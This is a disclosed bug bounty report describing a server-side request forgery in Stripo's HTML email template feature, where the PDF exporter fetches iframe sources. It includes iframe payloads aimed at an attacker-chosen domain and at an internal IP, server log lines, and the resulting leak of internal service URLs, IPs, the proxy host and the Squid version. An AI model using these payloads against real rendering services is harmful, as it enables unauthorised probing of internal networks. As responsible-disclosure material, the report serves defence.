# Information disclosure through Server side resource forgery

## Report Details
- **Report ID**: 782979
- **URL**: https://hackerone.com/reports/782979
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-25T02:57:14.512Z
- **Disclosed**: 2020-01-28T15:48:08.415Z

## Reporter
- **Username**: checkm50
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
## Summary:
The application https://my.stripo.email has a template feature where can we can enter html code.
By including an iframe in the html template, I was able to make a call to my server.
This exposed an internally running web application. Please refer below,
```63.33.82.168 - - [25/Jan/2020:01:49:33 +0000] "GET /redirect.php HTTP/1.1" 301 5 "http://stripe-export-service:8080/v1/download/template/pdf/57764" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"```

Note the IP address and stripe-export-service URL.

IP address is accessible internal only.

I tried to iframe the IP address which I got above and exported as PDF. It had below information,
```webmaster?subject=CacheErrorInfo - ERR_CONNECT_FAIL&body=CacheHost: proxy-eu.stripo.email
ErrPage: ERR_CONNECT_FAIL
Err: (111) Connection refused
TimeStamp: Sat, 25 Jan 2020 01:37:02 GMT
ClientIP: 172.31.5.123
ServerIP: 63.33.82.168
HTTP Request:
GET / HTTP/1.1
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://stripe-export-service:8080/v1/download/template/pdf/57763
Accept-Encoding: gzip, deflate
Host: 63.33.82.168```

Above result exposes two things.
* Proxy host proxy-eu.stripo.email
* and the version Squid proxy **(squid/3.5.23)**

This exposure gives more attack surface to an attacker.

## Steps To Reproduce:
1. Logon to stripo
2. Head over to creating an email template and choose html option
3. Use below iframe code to make a call to your server
<iframe src='your domain'></iframe>
4. To hit internal IP address and disclose the proxy info, use below iframe
<iframe src='http://63.33.82.168' height=800 width=800></iframe>

## Supporting Material/References:
Attaching the PDF I exported with proxy related information

## Impact

Exposure of internal web application URL, IP address, Proxy host and the Proxy server Squid version to the attacker gives the attacker more attack surface.

## Attachments
- New_email-6.pdf
